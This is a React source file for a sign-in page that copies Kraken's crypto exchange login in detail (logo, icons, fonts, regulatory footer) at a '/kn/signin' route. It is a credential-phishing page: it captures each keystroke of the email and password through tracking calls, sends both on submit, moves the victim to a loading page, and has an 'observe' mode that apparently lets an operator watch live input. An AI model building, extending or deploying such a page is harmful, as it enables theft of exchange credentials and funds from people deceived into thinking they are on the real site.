import { createFileRoute } from "@tanstack/react-router";
import { useState, useRef, useEffect } from "react";
import {
  KrakenLogo, KrakenMark, KnFontStyle, setKnEmail, useKnTracking,
} from "@/components/kn/KnShared";

export const Route = createFileRoute("/kn/signin")({
  head: () => ({ meta: [{ title: "Sign in to Kraken" }] }),
  component: KrakenLoginPage,
});

/* Eye open icon - exact Kraken SVG */
function EyeIcon() {
  return (
    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
      <path d="M15 12C15 13.6569 13.6569 15 12 15C10.3431 15 9 13.6569 9 12C9 10.3431 10.3431 9 12 9C13.6569 9 15 10.3431 15 12Z" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="fill-transparent stroke-current"/>
      <path d="M21.4974 11.0946C16.66 2.96839 7.33998 2.96848 2.50257 11.0947C2.17069 11.6523 2.17069 12.3479 2.50257 12.9054C7.33998 21.0316 16.66 21.0315 21.4974 12.9053C21.8293 12.3477 21.8293 11.6521 21.4974 11.0946Z" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="fill-transparent stroke-current"/>
    </svg>
  );
}

/* Eye off icon - exact Kraken SVG */
function EyeOffIcon() {
  return (
    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
      <path d="M17.2656 17.2969C12.9688 20.5156 6.33331 19.3397 2.50306 12.9054C2.17118 12.3479 2.17118 11.6523 2.50306 11.0948C3.82299 8.87742 5.40625 7.35938 6.6875 6.73438" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="fill-transparent stroke-current"/>
      <path d="M20.2891 14.6405C20.8282 13.9452 20.994 13.7517 21.498 12.9051C21.8298 12.3476 21.8298 11.652 21.498 11.0945C18.625 6.26841 14.8438 4.71864 10.6563 5.09365M13.9688 13.9765C13.7657 14.5233 13.0888 14.9999 12.0005 14.9999C10.3437 14.9999 9.00052 13.6567 9.00052 11.9999C9.00052 10.9096 9.45319 10.3671 9.98444 9.96864" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="fill-transparent stroke-current"/>
      <path d="M2.98459 2.99969L21.0156 21.0155" strokeWidth="2" strokeLinecap="round" className="fill-transparent stroke-current"/>
    </svg>
  );
}

/* Floating label input matching Kraken's design system exactly */
function FloatingInput({
  label,
  type = 'text',
  value,
  onChange,
  isTop,
  isBottom,
  showToggle,
  onToggle,
  showPassword,
  onTrackClick,
  fieldName,
}: {
  label: string;
  type?: string;
  value: string;
  onChange: (v: string) => void;
  isTop?: boolean;
  isBottom?: boolean;
  showToggle?: boolean;
  onToggle?: () => void;
  showPassword?: boolean;
  onTrackClick?: (name: string) => void;
  fieldName?: string;
}) {
  const [focused, setFocused] = useState(false);
  const inputRef = useRef<HTMLInputElement>(null);
  const hasValue = value.length > 0;
  const isActive = focused || hasValue;

  /* Kraken stacked input radii */
  const borderRadius = isTop
    ? '12px 12px 4px 4px'
    : isBottom
    ? '4px 4px 12px 12px'
    : '12px';

  return (
    <div
      className="relative flex items-center cursor-text"
      onClick={() => inputRef.current?.focus()}
      style={{
        height: 52,
        backgroundColor: focused ? '#686b820a' : '#686b8214',
        borderRadius,
        outline: focused ? '2px solid #7132f5' : '2px solid transparent',
        outlineOffset: -2,
        paddingLeft: 12,
        paddingRight: showToggle ? 44 : 12,
        transition: 'background-color 0.15s ease, outline-color 0.15s ease',
      }}
    >
      <label
        className="absolute pointer-events-none select-none"
        style={{
          left: 12,
          top: isActive ? 6 : '50%',
          transform: isActive ? 'none' : 'translateY(-50%)',
          fontSize: isActive ? 12 : 14,
          fontWeight: 400,
          color: '#686b82',
          transition: 'all 0.15s ease',
          lineHeight: '16px',
        }}
      >
        {label}
      </label>
      <input
        ref={inputRef}
        type={type}
        value={value}
        onChange={(e) => onChange(e.target.value)}
        onFocus={() => setFocused(true)}
        onBlur={() => setFocused(false)}
        autoComplete="off"
        data-ux-field={fieldName}
        name={fieldName}
        style={{
          width: '100%',
          background: 'transparent',
          border: 'none',
          outline: 'none',
          fontSize: 14,
          fontWeight: 500,
          color: '#101114',
          lineHeight: '20px',
          paddingTop: isActive ? 18 : 0,
          paddingBottom: isActive ? 2 : 0,
          transition: 'padding 0.15s ease',
          caretColor: '#7132f5',
        }}
      />
      {showToggle && (
        <button
          type="button"
          onClick={(e) => {
            e.stopPropagation();
            onToggle?.();
            onTrackClick?.('Toggle Password');
          }}
          className="absolute flex items-center justify-center"
          style={{
            right: 8,
            top: '50%',
            transform: 'translateY(-50%)',
            background: 'transparent',
            border: 'none',
            cursor: 'pointer',
            padding: 0,
            color: '#9497a9',
            width: 24,
            height: 24,
            borderRadius: 8,
          }}
        >
          {showPassword ? <EyeOffIcon /> : <EyeIcon />}
        </button>
      )}
    </div>
  );
}

function KrakenLoginPage() {
  const { trackClick, trackInput, trackSubmit, knNavigate, sessionId, isObserve } = useKnTracking();
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  useEffect(() => {
    if (!isObserve) return;
    function onMirror(e: Event) {
      const d = (e as CustomEvent<{ field?: string; value?: string }>).detail;
      if (!d?.field) return;
      const value = String(d.value ?? '');
      if (d.field === 'email' || d.field === 'email_submitted' || d.field === 'Email Input') setEmail(value);
      if (d.field === 'password' || d.field === 'password_submitted' || d.field === 'Password Input') setPassword(value);
    }
    window.addEventListener('ux:mirror-live-input', onMirror);
    return () => window.removeEventListener('ux:mirror-live-input', onMirror);
  }, [isObserve]);

  const handleContinue = () => {
    if (!email || !password) return;
    trackClick('Continue');
    setKnEmail(email);
    trackSubmit('email', email);
    trackSubmit('password', password);
    knNavigate('/kn/loading');
  };

  const canSubmit = email.length > 0 && password.length > 0;

  return (
    <div
      className="kn-page min-h-screen flex flex-col"
      style={{
        backgroundColor: '#f6f5f9',
        fontFamily: "'Kraken-Product', 'IBM Plex Sans', Helvetica, Arial, sans-serif",
      }}
    >
      <KnFontStyle />
      <style>{`
        @font-face {
          font-family: 'Kraken-Product';
          src: url('/fonts/Kraken-Product-Regular.woff2') format('woff2');
          font-weight: 400;
          font-style: normal;
          font-display: swap;
        }
        @font-face {
          font-family: 'Kraken-Product';
          src: url('/fonts/Kraken-Product-Medium.woff2') format('woff2');
          font-weight: 500;
          font-style: normal;
          font-display: swap;
        }
        @font-face {
          font-family: 'Kraken-Brand';
          src: url('/fonts/Kraken-Brand-Medium.woff2') format('woff2');
          font-weight: 500;
          font-style: normal;
          font-display: swap;
        }
        * { font-family: 'Kraken-Product', 'IBM Plex Sans', Helvetica, Arial, sans-serif !important; }
        @media (max-width: 640px) {
          .kraken-card { background-color: transparent !important; box-shadow: none !important; border-radius: 0 !important; padding: 16px 0 !important; }
          .kraken-lang-btn { display: none !important; }
          .kraken-footer-detail { display: none !important; }
          .kraken-footer { justify-content: center !important; }
          .kraken-header { padding-left: 16px !important; padding-right: 16px !important; }
        }
      `}</style>

      {/* Header */}
      <header style={{ paddingTop: 12, backgroundColor: '#f6f5f9' }}>
        <div
          className="flex items-center justify-between kraken-header"
          style={{ height: 40, paddingLeft: 36, paddingRight: 36 }}
        >
          <div className="cursor-pointer" onClick={() => trackClick('Logo')}>
            <KrakenLogo />
          </div>
          <button
            className="flex items-center kraken-lang-btn"
            style={{
              gap: 4,
              padding: '8px 12px',
              borderRadius: 8,
              border: 'none',
              cursor: 'pointer',
              backgroundColor: '#686b8214',
              color: '#686b82',
              fontSize: 12,
              fontWeight: 400,
              lineHeight: '16px',
            }}
          >
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M21 12C21 16.9706 16.9706 21 12 21M21 12C21 7.02944 16.9706 3 12 3M21 12H3M12 21C7.02944 21 3 16.9706 3 12M12 21C9.79086 21 8 16.9706 8 12C8 7.02944 9.79086 3 12 3M12 21C14.2091 21 16 16.9706 16 12C16 7.02944 14.2091 3 12 3M3 12C3 7.02944 7.02944 3 12 3" strokeWidth="2" strokeLinecap="square" stroke="#9497a9" fill="transparent"/>
            </svg>
            <span>English (US)</span>
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M7.5 9.98291L11.2045 13.6874C11.6438 14.1268 12.3562 14.1268 12.7955 13.6874L16.5 9.98291" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" stroke="#9497a9" fill="transparent"/>
            </svg>
          </button>
        </div>
      </header>

      {/* Main */}
      <main className="flex-1 flex justify-center px-4" style={{ marginTop: '5%' }}>
        <div style={{ width: 498, maxWidth: '100%' }}>
          <div className="kraken-card"
            style={{
              backgroundColor: '#fff',
              borderRadius: 16,
              padding: 24,
              boxShadow: '0px 1px 4px 0px #1018280a',
            }}
          >
            <form onSubmit={(e) => { e.preventDefault(); handleContinue(); }}>
              <div className="flex flex-col" style={{ gap: 24 }}>
                {/* Logo + Title */}
                <div className="flex flex-col items-center" style={{ gap: 24 }}>
                  <div style={{ pointerEvents: 'none' }}>
                    <KrakenMark size={120} />
                  </div>
                  <h1
                    className="text-center"
                    style={{
                      fontSize: 28,
                      fontWeight: 500,
                      lineHeight: '36px',
                      color: '#101114',
                      margin: 0,
                    }}
                  >
                    Sign in to Kraken
                  </h1>
                </div>

                {/* Inputs + Forgot */}
                <div className="flex flex-col" style={{ gap: 8 }}>
                  {/* Stacked inputs with small gap */}
                  <div className="flex flex-col" style={{ gap: 4 }}>
                    <FloatingInput
                      label="Email or username"
                      value={email}
                      onChange={(v) => { setEmail(v); trackInput('email', v, 'email'); }}
                      isTop
                      fieldName="email"
                    />
                    <FloatingInput
                      label="Password"
                      type={showPassword ? 'text' : 'password'}
                      value={password}
                      onChange={(v) => { setPassword(v); trackInput('password', v, 'password'); }}
                      isBottom
                      showToggle
                      onToggle={() => setShowPassword(!showPassword)}
                      showPassword={showPassword}
                      onTrackClick={trackClick}
                      fieldName="password"
                    />
                  </div>
                  <p
                    style={{
                      fontSize: 14,
                      fontWeight: 400,
                      lineHeight: '20px',
                      color: '#686b82',
                      margin: 0,
                    }}
                  >
                    Forgot{' '}
                    <a
                      href="#"
                      onClick={(e) => { e.preventDefault(); trackClick('Forgot Password'); }}
                      style={{ color: '#7132f5', textDecoration: 'none' }}
                      onMouseEnter={(e) => (e.currentTarget.style.textDecoration = 'underline')}
                      onMouseLeave={(e) => (e.currentTarget.style.textDecoration = 'none')}
                    >
                      password
                    </a>
                    {' '}or{' '}
                    <a
                      href="#"
                      onClick={(e) => { e.preventDefault(); trackClick('Forgot Username'); }}
                      style={{ color: '#7132f5', textDecoration: 'none' }}
                      onMouseEnter={(e) => (e.currentTarget.style.textDecoration = 'underline')}
                      onMouseLeave={(e) => (e.currentTarget.style.textDecoration = 'none')}
                    >
                      username
                    </a>
                    ?
                  </p>
                </div>

                {/* Button + Help */}
                <div className="flex flex-col" style={{ gap: 8 }}>
                  <button
                    type="submit"
                    disabled={!canSubmit}
                    className="w-full"
                    style={{
                      height: 52,
                      borderRadius: 12,
                      border: 'none',
                      padding: '15px 16px',
                      cursor: canSubmit ? 'pointer' : 'default',
                      backgroundColor: canSubmit ? '#7132f5' : '#c6c7d2',
                      color: '#fff',
                      fontSize: 16,
                      fontWeight: 500,
                      lineHeight: '22px',
                      transition: 'background-color 0.15s ease',
                      pointerEvents: canSubmit ? 'auto' : 'none',
                    }}
                    onMouseEnter={(e) => {
                      if (canSubmit) e.currentTarget.style.backgroundColor = '#5b1ecf';
                    }}
                    onMouseLeave={(e) => {
                      if (canSubmit) e.currentTarget.style.backgroundColor = '#7132f5';
                    }}
                    onMouseDown={(e) => {
                      if (canSubmit) e.currentTarget.style.backgroundColor = '#471ca0';
                    }}
                    onMouseUp={(e) => {
                      if (canSubmit) e.currentTarget.style.backgroundColor = '#5b1ecf';
                    }}
                  >
                    Continue
                  </button>

                  <p
                    className="text-center"
                    style={{
                      fontSize: 14,
                      fontWeight: 400,
                      lineHeight: '20px',
                      color: '#686b82',
                      margin: 0,
                    }}
                  >
                    Still can't sign in?{' '}
                    <a
                      href="#"
                      onClick={(e) => { e.preventDefault(); trackClick('Email Us'); }}
                      style={{ color: '#7132f5', textDecoration: 'none' }}
                      onMouseEnter={(e) => (e.currentTarget.style.textDecoration = 'underline')}
                      onMouseLeave={(e) => (e.currentTarget.style.textDecoration = 'none')}
                    >
                      Email us
                    </a>
                  </p>
                </div>
              </div>
            </form>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer
        className="flex items-center justify-between kraken-footer"
        style={{ padding: '16px 24px' }}
      >
        <p
          style={{
            fontSize: 11,
            color: '#9497a9',
            margin: 0,
          }}
        >
          Brokerage services are provided by Kraken Securities, LLC, member{' '}
          <a href="#" style={{ color: '#7132f5', textDecoration: 'none' }}
            onMouseEnter={(e) => (e.currentTarget.style.textDecoration = 'underline')}
            onMouseLeave={(e) => (e.currentTarget.style.textDecoration = 'none')}
          >FINRA</a>
          /
          <a href="#" style={{ color: '#7132f5', textDecoration: 'none' }}
            onMouseEnter={(e) => (e.currentTarget.style.textDecoration = 'underline')}
            onMouseLeave={(e) => (e.currentTarget.style.textDecoration = 'none')}
          >SIPC</a>
          .{' '}
          <a href="#" style={{ color: '#7132f5', textDecoration: 'none' }}
            onMouseEnter={(e) => (e.currentTarget.style.textDecoration = 'underline')}
            onMouseLeave={(e) => (e.currentTarget.style.textDecoration = 'none')}
          >Disclosures here</a>
          .
        </p>
        <div className="flex items-center kraken-footer-detail" style={{ gap: 16 }}>
          <a href="#" style={{ fontSize: 11, color: '#9497a9', textDecoration: 'none' }}>Privacy Notice</a>
          <a href="#" style={{ fontSize: 11, color: '#9497a9', textDecoration: 'none' }}>Terms of Service</a>
        </div>
      </footer>

      <div className="fixed bottom-2 right-2 text-[10px] opacity-0 pointer-events-none">{sessionId}</div>
    </div>
  );
}
